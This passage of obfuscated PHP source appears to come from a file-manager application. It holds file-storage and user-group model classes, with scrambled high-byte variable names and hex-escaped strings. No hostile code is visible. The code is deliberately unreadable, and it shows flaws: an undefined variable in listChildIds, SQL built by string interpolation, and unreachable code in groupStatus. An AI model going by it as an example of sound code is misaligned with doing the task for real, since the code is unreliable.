$šÈ™ÓÖ…; } if ($šÈ™ÓÖ… == $üíšö[1990]) { $¤•äİØÌ .= $üíšö[1314]; } break; case $üíšö[2055]: $Ìì‹ğÍÑ = Model($üíšö[865])->get($üíšö[866]); $ÆèÏ—˜ø = substr(md5($üíšö[867] . $Ìì‹ğÍÑ . date($üíšö[844])), 0, 8); $ßàèØî = KodIO::defaultDriver(); $ÉèïæéÅ = $üíšö[1345] . $ßàèØî[$üíšö[478]] . $üíšö[487] . date($üíšö[2056]) . $ÆèÏ—˜ø . $üíšö[8]; if ($šÈ™ÓÖ… == $üíšö[1990]) { $òŠÄÜÇø .= $üíšö[1314]; } $Áñáò§¾ = $üíšö[2057] . $ÉèïæéÅ . $òŠÄÜÇø; CacheLock::lock($Áñáò§¾); $¤•äİØÌ = $ÉèïæéÅ . $òŠÄÜÇø; if (IO::exist($ÉèïæéÅ . $òŠÄÜÇø)) { $ÎÎ¢…ƒ = substr($òŠÄÜÇø, 0, strlen($òŠÄÜÇø) - strlen($šÈ™ÓÖ…)); $Å„ÕÆ¾ = $ãÜìô÷ ? substr($ãÜìô÷, 0, 5) : ($Õö™õû ? substr($Õö™õû, 0, 5) : rand_string(5)); $¤•äİØÌ = $ÉèïæéÅ . $ÎÎ¢…ƒ . $Å„ÕÆ¾; if ($šÈ™ÓÖ…) { $¤•äİØÌ = $¤•äİØÌ . $üíšö[10] . $šÈ™ÓÖ…; } } if (IO::isOsDriver($¤•äİØÌ) && !IO::isUploadServer($¤•äİØÌ)) { if (IO::exist($¤•äİØÌ)) { CacheLock::unlock($Áñáò§¾); return $¤•äİØÌ; } $Íš‰Úµ½ = IO::setContent($¤•äİØÌ, $üíšö[12]); if (!$Íš‰Úµ½) { show_json($üíšö[2058], !1); } } CacheLock::unlock($Áñáò§¾); break; case $üíšö[871]: break; default: break; } return $¤•äİØÌ; } public function addFileByRemote($ºÜ…–Ïó, $ ¤âÉÎŸ, $·¢Œƒ›Ï = array()) { $óŒÊŸ¼… =& $_SERVER[ÅÄÇĞô]; if (!IO::exist($ºÜ…–Ïó)) { return !1; } $ÛÔàÒœ = $·¢Œƒ›Ï[$óŒÊŸ¼…[552]] ? $·¢Œƒ›Ï[$óŒÊŸ¼…[552]] : $óŒÊŸ¼…[12]; $‡¦¨¾—é = IO::hashMd5($ºÜ…–Ïó, $ÛÔàÒœ); $ïÈµ˜®Ò = KodIO::defaultDriver(); $‹ÉÓõÆ  = array($óŒÊŸ¼…[625] => IO::size($ºÜ…–Ïó), $óŒÊŸ¼…[2059] => 1, $óŒÊŸ¼…[497] => $ ¤âÉÎŸ, $óŒÊŸ¼…[908] => $ïÈµ˜®Ò[$óŒÊŸ¼…[478]], $óŒÊŸ¼…[498] => $ºÜ…–Ïó, $óŒÊŸ¼…[2060] => $·¢Œƒ›Ï[$óŒÊŸ¼…[680]] ? $·¢Œƒ›Ï[$óŒÊŸ¼…[680]] : IO::hashSimple($ºÜ…–Ïó), $óŒÊŸ¼…[2061] => $‡¦¨¾—é ? $‡¦¨¾—é : $ÛÔàÒœ); if ($£º¨é– = $this->addFileCheckExist($‹ÉÓõÆ [$óŒÊŸ¼…[680]], $‹ÉÓõÆ [$óŒÊŸ¼…[552]], $‹ÉÓõÆ [$óŒÊŸ¼…[79]])) { return $£º¨é–; } return $this->addFileData($‹ÉÓõÆ ); } private function addFileData($½ûïÙú) { $ÅŸÔ²Ø =& $_SERVER[ÅÄÇĞô]; if (!$½ûïÙú) { return !1; } $½ûïÙú[$ÅŸÔ²Ø[79]] = intval($½ûïÙú[$ÅŸÔ²Ø[79]]); if (!$½ûïÙú[$ÅŸÔ²Ø[79]] && strlen($½ûïÙú[$ÅŸÔ²Ø[680]]) > 32) { $½ûïÙú[$ÅŸÔ²Ø[79]] = intval(substr($½ûïÙú[$ÅŸÔ²Ø[680]], 32)); } $ó»˜Œ€ä = $this->add($½ûïÙú); return $this->find($ó»˜Œ€ä); } public function addFile($ü‡¢Á…ö, $¬öà­ˆ, $—™äóÕæ = false) { $Öêğ´¿¤ =& $_SERVER[ÅÄÇĞô]; $ĞÌáªµ = IO::hashSimple($ü‡¢Á…ö); $àûªÛêÌ = IO::size($ü‡¢Á…ö); $„Ó¹¶â = $àûªÛêÌ <= 1024 * 1024 * 10 ? IO::hashMd5($ü‡¢Á…ö) : $Öêğ´¿¤[12]; $†¹µº‰˜ = $Öêğ´¿¤[2062] . $ĞÌáªµ; CacheLock::lock($†¹µº‰˜); if ($„Ó¹¶â && $ĞÌáªµ) { $ãúö¬ı‰ = $this->addFileCheckExist($ĞÌáªµ, $„Ó¹¶â, $àûªÛêÌ); if ($ãúö¬ı‰) { CacheLock::unlock($†¹µº‰˜); return $ãúö¬ı‰; } } $öÙ¹°åª = $this->addFileMake($ü‡¢Á…ö, $àûªÛêÌ, $ĞÌáªµ, $„Ó¹¶â, $¬öà­ˆ, $—™äóÕæ); $î”™ä‰ = $this->addFileData($öÙ¹°åª); if (!$î”™ä‰) { return !1; } CacheLock::unlock($†¹µº‰˜); if (!$„Ó¹¶â && $î”™ä‰) { $this->fileMd5Check($î”™ä‰); } return $î”™ä‰; } public function fileMd5Check($Âı«õ‹¶) { $ë‹ĞÌ£ =& $_SERVER[ÅÄÇĞô]; $ÊÆÛ˜¦¯ = array($Âı«õ‹¶[$ë‹ĞÌ£[546]], $Âı«õ‹¶[$ë‹ĞÌ£[87]]); $È¹øóó® = $ë‹ĞÌ£[2063] . $Âı«õ‹¶[$ë‹ĞÌ£[87]]; $°ôø·Ç = $ë‹ĞÌ£[2064] . $Âı«õ‹¶[$ë‹ĞÌ£[546]]; TaskQueue::add($ë‹ĞÌ£[2065], $ÊÆÛ˜¦¯, $È¹øóó®, $°ôø·Ç); } public function fileMd5Set($¨¶©ûıÇ, $½ÓüÀ¸À) { $¥ª¦Òë‹ =& $_SERVER[ÅÄÇĞô]; $ú¬ÄŠ±Ò = $this->find($¨¶©ûıÇ); if (!$ú¬ÄŠ±Ò || $ú¬ÄŠ±Ò[$¥ª¦Òë‹[552]]) { return; } $›”ğ”¸… = IO::hashMd5($½ÓüÀ¸À); if (!$›”ğ”¸…) { return $¥ª¦Òë‹[12]; } $this->where(array($¥ª¦Òë‹[546] => $¨¶©ûıÇ))->save(array($¥ª¦Òë‹[552] => $›”ğ”¸…)); } public function addFileMake($ÌÌŠíõ¨, $Ø¶Á‡¶, $÷§»ÂÑ, $âÛ İ’Î, $“àÓß•, $»ËĞ”Ñ) { $•¥Ñéšê =& $_SERVER[ÅÄÇĞô]; $¯ÒÖ—Ø½ = $this->createFileName($“àÓß•, $÷§»ÂÑ, $âÛ İ’Î); $äú…§ğ˜ = get_path_father($¯ÒÖ—Ø½); $’ÊÁƒÔ = get_path_this($¯ÒÖ—Ø½); if ($»ËĞ”Ñ) { $¸Ÿ­î¶ = IO::move($ÌÌŠíõ¨, $äú…§ğ˜, !1, $’ÊÁƒÔ); } else { $¸Ÿ­î¶ = IO::copy($ÌÌŠíõ¨, $äú…§ğ˜, !1, $’ÊÁƒÔ); } if (!$¸Ÿ­î¶) { return !1; } $Ø‘ıÉøñ = IO::init($¸Ÿ­î¶); $Ø‘ıÉøñ->cacheMethod($•¥Ñéšê[182], $Ø‘ıÉøñ->path, $•¥Ñéšê[179]); if (IO::size($¸Ÿ­î¶) != $Ø¶Á‡¶) { return !1; } $Š’”„Æ = KodIO::defaultDriver(); $©‡¡œøÁ = array($•¥Ñéšê[625] => $Ø¶Á‡¶, $•¥Ñéšê[2059] => 1, $•¥Ñéšê[497] => $“àÓß•, $•¥Ñéšê[908] => $Š’”„Æ[$•¥Ñéšê[478]], $•¥Ñéšê[498] => $¯ÒÖ—Ø½, $•¥Ñéšê[2060] => $÷§»ÂÑ, $•¥Ñéšê[2061] => $âÛ İ’Î); return $©‡¡œøÁ; } public function addFileCheckExist($ê¤ı×”ò, $ñØƒ²˜, $²…Û€öÈ) { $âåàŒ„ =& $_SERVER[ÅÄÇĞô]; $´»ì¹À = $this->findByHash($ê¤ı×”ò, $ñØƒ²˜); if (!$´»ì¹À) { return !1; } $³ü÷ù• = array($âåàŒ„[2059] => intval($´»ì¹À[$âåàŒ„[2066]]) + 1, $âåàŒ„[625] => $²…Û€öÈ); $this->where(array($âåàŒ„[547] => $´»ì¹À[$âåàŒ„[546]]))->save($³ü÷ù•); return $´»ì¹À; } public function remove($¸Ğö‚µ) { $this->linkCountChange($¸Ğö‚µ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Áâ¡½…ª) { $this->linkCountChange($Áâ¡½…ª, !0); } public function linkCountChange($•”ëÍÌ«, $’óœÍÒ) { $ë®Óœªœ =& $_SERVER[ÅÄÇĞô]; if (!$•”ëÍÌ«) { return; } if (!is_array($•”ëÍÌ«)) { $•”ëÍÌ« = array($•”ëÍÌ«); } $æå¸±ÃÊ = array(); foreach ($•”ëÍÌ« as $ô³Ô­ßÒ) { $ãÖµòú = $ô³Ô­ßÒ . $ë®Óœªœ[12]; if (!$æå¸±ÃÊ[$ãÖµòú]) { $æå¸±ÃÊ[$ãÖµòú] = 0; } $æå¸±ÃÊ[$ãÖµòú]++; } $÷ğíßò = array(); foreach ($æå¸±ÃÊ as $ô³Ô­ßÒ => $ÏßøĞ…ˆ) { $ãÖµòú = $ÏßøĞ…ˆ . $ë®Óœªœ[12]; if (!$÷ğíßò[$ãÖµòú]) { $÷ğíßò[$ãÖµòú] = array(); } $÷ğíßò[$ãÖµòú][] = $ô³Ô­ßÒ; } foreach ($÷ğíßò as $ÏßøĞ…ˆ => $ö§Ñş©á) { if (!$ö§Ñş©á) { continue; } $ÏßøĞ…ˆ = $’óœÍÒ ? $ÏßøĞ…ˆ : -intval($ÏßøĞ…ˆ); $ğÙÎıì = array($ë®Óœªœ[546] => array($ë®Óœªœ[7], $ö§Ñş©á)); if ($ÏßøĞ…ˆ < 0) { $ğÙÎıì[$ë®Óœªœ[2066]] = array($ë®Óœªœ[1115], abs($ÏßøĞ…ˆ)); } $this->where($ğÙÎıì)->setAdd($ë®Óœªœ[2066], $ÏßøĞ…ˆ); } } public function findByHash($úäÈç£, $½Ê…ú½» = false) { $‚­È¨¹² =& $_SERVER[ÅÄÇĞô]; if (!$úäÈç£ && !$½Ê…ú½») { return !1; } $‘ÚŒ¯Ò« = array($‚­È¨¹²[2060] => $úäÈç£); if ($½Ê…ú½») { $‘ÚŒ¯Ò« = array($‚­È¨¹²[2061] => $½Ê…ú½»); } return $this->order($‚­È¨¹²[2067])->where($‘ÚŒ¯Ò«)->find(); } public function clearEmpty($Ç®ÔÌ• = 1) { $ƒÊíü· =& $_SERVER[ÅÄÇĞô]; $êÃÁ—Á = time() - 3600 * 24 * $Ç®ÔÌ•; $ø¯ïÛ²× = $ƒÊíü·[2068] . $êÃÁ—Á; $ÙÔ×ÑÅï = $this->where($ø¯ïÛ²×)->select(); if (!$ÙÔ×ÑÅï) { return; } $†ÒËçØ« = new Task($ƒÊíü·[2069], $ƒÊíü·[12], count($ÙÔ×ÑÅï)); foreach ($ÙÔ×ÑÅï as $Ç¯ßğß) { $†ÒËçØ«->update(1); $this->resetFile($Ç¯ßğß); } $†ÒËçØ«->end(); } public function resetFile($åĞ»¹Ëê) { $¦—öìÀ =& $_SERVER[ÅÄÇĞô]; $ô¬É‘¼± = array($¦—öìÀ[547] => $åĞ»¹Ëê[$¦—öìÀ[546]]); $Ÿè²òùÌ = Model($¦—öìÀ[1444])->where($ô¬É‘¼±)->count(); $›ç‘Å”³ = Model($¦—öìÀ[2070])->where($ô¬É‘¼±)->count(); $Æ©ÙíÎÓ = intval($Ÿè²òùÌ) + intval($›ç‘Å”³); if ($Æ©ÙíÎÓ == 0) { IO::remove($åĞ»¹Ëê[$¦—öìÀ[87]]); Model($¦—öìÀ[2071])->delete($åĞ»¹Ëê[$¦—öìÀ[546]]); $this->where($ô¬É‘¼±)->delete(); $this->metaSet($åĞ»¹Ëê[$¦—öìÀ[546]], null, null); write_log(ACTION . $¦—öìÀ[2072] . KodUser::id() . $¦—öìÀ[2073] . $åĞ»¹Ëê[$¦—öìÀ[546]] . $¦—öìÀ[2074] . $åĞ»¹Ëê[$¦—öìÀ[79]] . $¦—öìÀ[202] . $åĞ»¹Ëê[$¦—öìÀ[87]], $¦—öìÀ[2075]); return; } if ($åĞ»¹Ëê[$¦—öìÀ[2066]] != $Æ©ÙíÎÓ) { $this->where($ô¬É‘¼±)->save(array($¦—öìÀ[2059] => $Æ©ÙíÎÓ)); } } public function storageInfo($ºğçÂÌı = false) { $¦„šĞäë =& $_SERVER[ÅÄÇĞô]; $Æúšõƒ = $this->count() + 0.0; $‚üŸ—Ê = 0; $—½È»á‘ = 1; $üÜÚÇš“ = 0; $ô¡´ôÆ = 5000; for ($óÓ²äÌë = 0; $óÓ²äÌë < $Æúšõƒ; $óÓ²äÌë = $óÓ²äÌë + $ô¡´ôÆ) { $óÕ¬Œº¶ = $this->limit($óÓ²äÌë, $óÓ²äÌë + $ô¡´ôÆ)->select(); foreach ($óÕ¬Œº¶ as $×™å»ÛÍ) { $—½È»á‘ += $×™å»ÛÍ[$¦„šĞäë[79]] * $×™å»ÛÍ[$¦„šĞäë[2066]]; $‚üŸ—Ê += $×™å»ÛÍ[$¦„šĞäë[79]] * ($×™å»ÛÍ[$¦„šĞäë[2066]] - 1); $üÜÚÇš“ += $×™å»ÛÍ[$¦„šĞäë[2066]]; } } $°šàîæË = array($¦„šĞäë[2076] => $—½È»á‘, $¦„šĞäë[2077] => $‚üŸ—Ê, $¦„šĞäë[2078] => $‚üŸ—Ê / $—½È»á‘, $¦„šĞäë[83] => $Æúšõƒ, $¦„šĞäë[2079] => $üÜÚÇš“); return $°šàîæË; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\155\145" => "\147\162\157\165\x70\x5f\155\x65\164\x61", "\x6d\145\x74\141\106\151\145\154\x64" => "\x67\162\157\x75\x70\111\104"); protected function cacheFunctionAlias($‚Ì¦Ü·) { $Ÿó ¿­ä =& $_SERVER[ÅÄÇĞô]; return array($Ÿó ¿­ä[2080] => array($‚Ì¦Ü·[0], $Ÿó ¿­ä[2081]), $Ÿó ¿­ä[2082] => array($‚Ì¦Ü·[0], $Ÿó ¿­ä[2083])); } protected function getInfo($ô¨ğòç, $è¾…çºì = false) { $ß¿˜Ğ‰Ö = $this->getInfoSimple($ô¨ğòç); if (!$ß¿˜Ğ‰Ö) { return !1; } if ($è¾…çºì) { return $this->_listDataApplyItem($ß¿˜Ğ‰Ö); } return $this->cacheFunctionGet($_SERVER[ÅÄÇĞô][2084], $ô¨ğòç); } protected function getInfoSimple($‚Æô¿Ş, $øŠâ„‡“ = false) { $à—Ü÷°ê =& $_SERVER[ÅÄÇĞô]; if ($øŠâ„‡“) { $“°Şè‡³ = array($à—Ü÷°ê[1998] => intval($‚Æô¿Ş)); $¶“şÔŞÂ = $this->where($“°Şè‡³)->find(); return is_array($¶“şÔŞÂ) ? $¶“şÔŞÂ : array(); } return $this->cacheFunctionGet($à—Ü÷°ê[2085], $‚Æô¿Ş); } protected function groupAdd($±ƒŒ«²) { $şÔŠ ê =& $_SERVER[ÅÄÇĞô]; if (!$±ƒŒ«²[$şÔŠ ê[193]] && isset($±ƒŒ«²[$şÔŠ ê[1998]]) && $±ƒŒ«²[$şÔŠ ê[1998]] == 1) { if ($ÉÂ‹Âã• = $this->getInfoSimple($±ƒŒ«²[$şÔŠ ê[1998]], !0)) { return $±ƒŒ«²[$şÔŠ ê[1998]]; } } else { $ÉÂ‹Âã• = $this->getInfoSimple($±ƒŒ«²[$şÔŠ ê[193]]); if (!$ÉÂ‹Âã•) { return !1; } } $Ê¶ØäÕ­ = $şÔŠ ê[598]; if ($ÉÂ‹Âã•[$şÔŠ ê[589]]) { $Ê¶ØäÕ­ = $ÉÂ‹Âã•[$şÔŠ ê[589]] . $ÉÂ‹Âã•[$şÔŠ ê[1998]] . $şÔŠ ê[50]; } $—àƒëŒğ = array($şÔŠ ê[497] => $this->groupNameAuto($±ƒŒ«²[$şÔŠ ê[193]], $±ƒŒ«²[$şÔŠ ê[32]]), $şÔŠ ê[480] => $±ƒŒ«²[$şÔŠ ê[193]], $şÔŠ ê[660] => $Ê¶ØäÕ­, $şÔŠ ê[2086] => $±ƒŒ«²[$şÔŠ ê[1984]], $şÔŠ ê[2087] => 0, $şÔŠ ê[2002] => 0); if (isset($±ƒŒ«²[$şÔŠ ê[2022]])) { $—àƒëŒğ[$şÔŠ ê[2022]] = $±ƒŒ«²[$şÔŠ ê[2022]]; } else { $Šå¯Õ’› = $this->max($şÔŠ ê[2022]); if (!$Šå¯Õ’›) { $Šå¯Õ’› = 0; } $—àƒëŒğ[$şÔŠ ê[2022]] = $Šå¯Õ’› + 1; } if (!empty($±ƒŒ«²[$şÔŠ ê[1998]])) { $—àƒëŒğ[$şÔŠ ê[1998]] = $±ƒŒ«²[$şÔŠ ê[1998]]; } $Áõôõˆ­ = $this->add($—àƒëŒğ); $this->setNamePinyin($Áõôõˆ­, $—àƒëŒğ[$şÔŠ ê[32]]); if (isset($±ƒŒ«²[$şÔŠ ê[2088]])) { $this->metaSet($Áõôõˆ­, array($şÔŠ ê[2088] => $±ƒŒ«²[$şÔŠ ê[2088]], $şÔŠ ê[2089] => $±ƒŒ«²[$şÔŠ ê[2089]])); unset($±ƒŒ«²[$şÔŠ ê[2088]]); unset($±ƒŒ«²[$şÔŠ ê[2089]]); } Model($şÔŠ ê[1444])->groupRootAdd($Áõôõˆ­); $this->_clearCache($±ƒŒ«²[$şÔŠ ê[193]]); return $Áõôõˆ­; } protected function groupEdit($ßÁæª¾, $©Ô§ÂèĞ) { $õí³ ˜½ =& $_SERVER[ÅÄÇĞô]; $ Òİëñ = $this->getInfoSimple($ßÁæª¾); if (!$ Òİëñ) { return !1; } if (!empty($©Ô§ÂèĞ[$õí³ ˜½[193]])) { $©Ñìœğ§ = $this->getInfoSimple($©Ô§ÂèĞ[$õí³ ˜½[193]]); if (!$©Ñìœğ§) { return !1; } if ($ Òİëñ[$õí³ ˜½[1998]] == $©Ñìœğ§[$õí³ ˜½[1998]]) { return !1; } if ($©Ô§ÂèĞ[$õí³ ˜½[193]] != $ Òİëñ[$õí³ ˜½[193]]) { if ($©Ñìœğ§[$õí³ ˜½[589]] !== $ Òİëñ[$õí³ ˜½[589]] && strpos($©Ñìœğ§[$õí³ ˜½[589]], $ Òİëñ[$õí³ ˜½[589]] . $ Òİëñ[$õí³ ˜½[1998]] . $õí³ ˜½[50]) === 0) { return !1; } $©Ô§ÂèĞ[$õí³ ˜½[660]] = $©Ñìœğ§[$õí³ ˜½[589]] . $©Ô§ÂèĞ[$õí³ ˜½[193]] . $õí³ ˜½[50]; $this->_changeChildLevel($ Òİëñ, $©Ñìœğ§); $this->_clearCache($©Ñìœğ§[$õí³ ˜½[1998]]); $this->_clearCache($ Òİëñ[$õí³ ˜½[193]]); } } if (isset($©Ô§ÂèĞ[$õí³ ˜½[32]])) { $this->setNamePinyin($ßÁæª¾, $©Ô§ÂèĞ[$õí³ ˜½[32]]); } if (isset($©Ô§ÂèĞ[$õí³ ˜½[2088]])) { $this->metaSet($ßÁæª¾, array($õí³ ˜½[2088] => $©Ô§ÂèĞ[$õí³ ˜½[2088]], $õí³ ˜½[2089] => $©Ô§ÂèĞ[$õí³ ˜½[2089]])); unset($©Ô§ÂèĞ[$õí³ ˜½[2088]]); unset($©Ô§ÂèĞ[$õí³ ˜½[2089]]); } $this->_clearChildrenCache($ Òİëñ); return $this->where(array($õí³ ˜½[2090] => $ßÁæª¾))->save($©Ô§ÂèĞ); } private function _clearChildrenCache($Äˆîæ¶) { $“Àñ¢ö„ =& $_SERVER[ÅÄÇĞô]; $ØÔ´Ëİ½ = array($“Àñ¢ö„[660] => array($“Àñ¢ö„[620], $Äˆîæ¶[$“Àñ¢ö„[589]] . $Äˆîæ¶[$“Àñ¢ö„[1998]] . $“Àñ¢ö„[621])); $ê¥ùÈùŞ = $this->field($“Àñ¢ö„[1998])->where($ØÔ´Ëİ½)->select(); foreach ($ê¥ùÈùŞ as $‰¿Ã†Õ£) { $this->_clearCache($‰¿Ã†Õ£[$“Àñ¢ö„[1998]]); } } private function _clearCache($ê’æ®…Ô) { $®É¹ÍÓ =& $_SERVER[ÅÄÇĞô]; $this->cacheFunctionClear($®É¹ÍÓ[2084], $ê’æ®…Ô); $this->cacheFunctionClear($®É¹ÍÓ[2085], $ê’æ®…Ô); } private function _changeChildLevel($ –ğÇÚ¥, $ÂğÒøûğ, $Ò¸Ç³¿Ê = false) { $»œÓÍÇ¿ =& $_SERVER[ÅÄÇĞô]; $’ËÃÙî = $ –ğÇÚ¥[$»œÓÍÇ¿[589]] . $ –ğÇÚ¥[$»œÓÍÇ¿[1998]] . $»œÓÍÇ¿[50]; $ã¯ˆ¦ã¯ = $ÂğÒøûğ[$»œÓÍÇ¿[589]] . $ÂğÒøûğ[$»œÓÍÇ¿[1998]] . $»œÓÍÇ¿[50] . $ –ğÇÚ¥[$»œÓÍÇ¿[1998]] . $»œÓÍÇ¿[50]; if ($Ò¸Ç³¿Ê) { $ã¯ˆ¦ã¯ = $ÂğÒøûğ[$»œÓÍÇ¿[589]] . $ÂğÒøûğ[$»œÓÍÇ¿[1998]] . $»œÓÍÇ¿[50]; } $ÜŒşç = array($»œÓÍÇ¿[660] => array($»œÓÍÇ¿[620], $ –ğÇÚ¥[$»œÓÍÇ¿[589]] . $ –ğÇÚ¥[$»œÓÍÇ¿[1998]] . $»œÓÍÇ¿[621])); $ŒµÜ²ü‰ = array($»œÓÍÇ¿[660] => array($»œÓÍÇ¿[669], "\x72\x65\160\x6c\141\x63\145\x28\160\x61\162\145\x6e\164\114\x65\166\x65\154\x2c\x27{$’ËÃÙî}\47\x2c\47{$ã¯ˆ¦ã¯}\x27\x29")); $this->_clearChildrenCache($ –ğÇÚ¥); $this->where($ÜŒşç)->data($ŒµÜ²ü‰)->save(); } public function setNamePinyin($ø¹öŸ¾, $ùí²Şù¸ = false) { $ªí’Èğé =& $_SERVER[ÅÄÇĞô]; if (!$ùí²Şù¸) { $ı„àáé = $this->getInfoSimple($ø¹öŸ¾); $ùí²Şù¸ = $ı„àáé[$ªí’Èğé[32]]; } if (!Input::check($ùí²Şù¸, $ªí’Èğé[663])) { $this->metaSet($ø¹öŸ¾, $ªí’Èğé[541], null); $this->metaSet($ø¹öŸ¾, $ªí’Èğé[540], null); return; } $×˜Íİ×× = array($ªí’Èğé[541] => str_replace($ªí’Èğé[53], $ªí’Èğé[12], Pinyin::get($ùí²Şù¸)), $ªí’Èğé[540] => Pinyin::get($ùí²Şù¸, $ªí’Èğé[664])); $this->metaSet($ø¹öŸ¾, $×˜Íİ××); } protected function metaSet($ùÊ¥©ÅÒ, $øÆâÖ’õ = null, $ü…”—ëÏ = null) { $this->_clearCache($ùÊ¥©ÅÒ); return parent::metaSet($ùÊ¥©ÅÒ, $øÆâÖ’õ, $ü…”—ëÏ); } protected function groupStatus($èÕŒ¸Œ, $îà‹Ñº) { $ÇæÊ¸Â‡ =& $_SERVER[ÅÄÇĞô]; $‘×¨î¶Ò = $this->getInfoSimple($èÕŒ¸Œ); if (!$‘×¨î¶Ò) { return !1; } $this->_clearCache($èÕŒ¸Œ); return $this->metaSet($èÕŒ¸Œ, $ÇæÊ¸Â‡[845], $îà‹Ñº); if ($îà‹Ñº == $ÇæÊ¸Â‡[91]) { $¾ğ÷İŠË = $this->parentLevelArray($‘×¨î¶Ò[$ÇæÊ¸Â‡[589]]); } else { } $¾ğ÷İŠË[] = $‘×¨î¶Ò[$ÇæÊ¸Â‡[1998]]; $Ÿ¯šÎşŒ = array(); foreach ($¾ğ÷İŠË as $èÕŒ¸Œ) { $Ÿ¯šÎşŒ[] = array($ÇæÊ¸Â‡[1998] => $èÕŒ¸Œ, $ÇæÊ¸Â‡[97] => $ÇæÊ¸Â‡[845], $ÇæÊ¸Â‡[453] => $îà‹Ñº); $this->_clearCache($èÕŒ¸Œ); } return Model($ÇæÊ¸Â‡[2091])->addAll($Ÿ¯šÎşŒ, array(), !0); } protected function groupRemove($Î×Çíô·, $ûíü‚À = false) { $ÅŸµº =& $_SERVER[ÅÄÇĞô]; $åùœäü = array($ÅŸµº[1998] => $Î×Çíô·); $’øÂé¼¦ = $this->where($åùœäü)->find(); if (!$’øÂé¼¦ || $’øÂé¼¦[$ÅŸµº[193]] == 0) { return !1; } if (!$ûíü‚À) { $»Ñ•ÌÍ¢ = $this->getInfoSimple($’øÂé¼¦[$ÅŸµº[193]]); $this->_changeChildLevel($’øÂé¼¦, $»Ñ•ÌÍ¢, !0); $this->where(array($ÅŸµº[193] => $Î×Çíô·))->save(array($ÅŸµº[193] => $’øÂé¼¦[$ÅŸµº[193]])); $this->_clearCache($»Ñ•ÌÍ¢[$ÅŸµº[1998]]); } Model($ÅŸµº[2091])->where($åùœäü)->delete(); Model($ÅŸµº[2092])->where($åùœäü)->delete(); Model($ÅŸµº[925])->groupRootRemove($Î×Çíô·); $this->_clearCache($’øÂé¼¦[$ÅŸµº[193]]); return $this->where($åùœäü)->delete(); } protected function groupSort($ïæúÎœõ) { $«¯Ü×ßè =& $_SERVER[ÅÄÇĞô]; $ªúŠúûÔ = array(); foreach ($ïæúÎœõ as $´œ§·§õ => $ù„¥Ä“Ü) { $ªúŠúûÔ[] = array($«¯Ü×ßè[1998], $ù„¥Ä“Ü, $«¯Ü×ßè[2022], $´œ§·§õ + 1); } $this->saveAll($ªúŠúûÔ); } public function listData() { $‡Ø¹ŸöŸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡Ø¹ŸöŸ[$_SERVER[ÅÄÇĞô][448]]); return $‡Ø¹ŸöŸ; } private function _makeOrder($ã‹¨Õ¬è = '') { $ñ’üë† =& $_SERVER[ÅÄÇĞô]; $ğ²ÁÄŒ = array($ñ’üë†[1998], $ñ’üë†[32], $ñ’üë†[1986], $ñ’üë†[234]); $½³™—Ó» = array($ñ’üë†[526] => $ñ’üë†[527], $ñ’üë†[528] => $ñ’üë†[529]); $¯ËœÏâ = Input::get($ñ’üë†[533], $ñ’üë†[7], $ñ’üë†[2002], $ğ²ÁÄŒ); $Àñóäüà = Input::get($ñ’üë†[534], $ñ’üë†[7], $ñ’üë†[2093], array($ñ’üë†[2093], $ñ’üë†[528])); $Àñóäüà = $½³™—Ó»[$Àñóäüà]; $ã‹¨Õ¬è = $ã‹¨Õ¬è . "{$¯ËœÏâ}\40{$Àñóäüà}\x2c\x20\147\162\x6f\x75\160\x49\x44\x20\x61\163\x63"; return $this->order($ã‹¨Õ¬è); } public function listChild($„€øÇ×Î) { $Ñø·º‹õ =& $_SERVER[ÅÄÇĞô]; $½Ÿİ˜°… = $this->where(array($Ñø·º‹õ[193] => $„€øÇ×Î))->_makeOrder()->selectPage(200); $this->_listDataApply($½Ÿİ˜°…[$Ñø·º‹õ[448]]); return $½Ÿİ˜°…; } public function listChildIds($úº–š²) { $İÈá¶Ï =& $_SERVER[ÅÄÇĞô]; if (is_string($ãâà¹ÓÍ)) { $úº–š² = explode($İÈá¶Ï[50], $úº–š²); } $ê€‡ÚéÆ = $this->where(array($İÈá¶Ï[1998] => array($İÈá¶Ï[7], $úº–š²)))->field($İÈá¶Ï[2094])->select(); if (!$ê€‡ÚéÆ) { return !1; } $›½ÔòËÁ = array(); foreach ($ê€‡ÚéÆ as $Ø¬£êï) { $›½ÔòËÁ[] = "\163\145\154\145\143\164\x20\147\162\157\x75\160\x49\104\x20\146\162\157\155\x20\140\x67\162\157\x75\160\140\x20\167\150\x65\162\x65\40\160\x61\162\x65\x6e\x74\x4c\x65\x76\145\154\40\154\x69\x6b\145\40\x27{$Ø¬£êï[$İÈá¶Ï[589]]}{$Ø¬£êï[$İÈá¶Ï[1998]]}\54\45\47"; } $›½ÔòËÁ = implode($İÈá¶Ï[2095], $›½ÔòËÁ); $ê€‡ÚéÆ = $this->query($›½ÔòËÁ); if (!$ê€‡ÚéÆ) { return array(); } $úº–š² = array_to_keyvalue($ê€‡ÚéÆ, $İÈá¶Ï[12], $İÈá¶Ï[1998]); return array_unique($úº–š²); } public function listByID($®Ëô­Û) { $òš–™¨± =& $_SERVER[ÅÄÇĞô]; if (!$®Ëô­Û) { return array(); } $ˆŒ÷Ó… = array($òš–™¨±[1998] => array($òš–™¨±[7], $®Ëô­Û)); $Ê¹ê€Áä = $this->where($ˆŒ÷Ó…)->select(); $Ê¹ê€Áä = array_sort_keep($Ê¹ê€Áä, $òš–™¨±[1998], $®Ëô­Û); $this->_listDataApply($Ê¹ê€Áä); return $Ê¹ê€Áä; } public function listSearch($ «øøç) { $”¼•·àï =& $_SERVER[ÅÄÇĞô]; $ƒØ¾ûı = trim($ «øøç[$”¼•·àï[2096]]); $“›ÒÏ»È = explode($”¼•·àï[53], $ƒØ¾ûı); if (!$ƒØ¾ûı || count($“›ÒÏ»È) == 1) { return $this->listSearchNow($ «øøç); } $Ûş¯ÖÚÆ = array($”¼•·àï[448] => array()); foreach ($“›ÒÏ»È as $À•¬øÅÕ) { if (!trim($À•¬øÅÕ)) { continue; } $ «øøç[$”¼•·àï[2096]] = $À•¬øÅÕ; $Øğ©€ÄÓ = $this->listSearchNow($ «øøç); $Ûş¯ÖÚÆ[$”¼•·àï[448]] = array_merge($Ûş¯ÖÚÆ[$”¼•·àï[448]], $Øğ©€ÄÓ[$”¼•·àï[448]]); } $Ûş¯ÖÚÆ[$”¼•·àï[448]] = array_unique_by_key($Ûş¯ÖÚÆ[$”¼•·àï[448]], $”¼•·àï[1998]); $Ûş¯ÖÚÆ[$”¼•·àï[445]] = 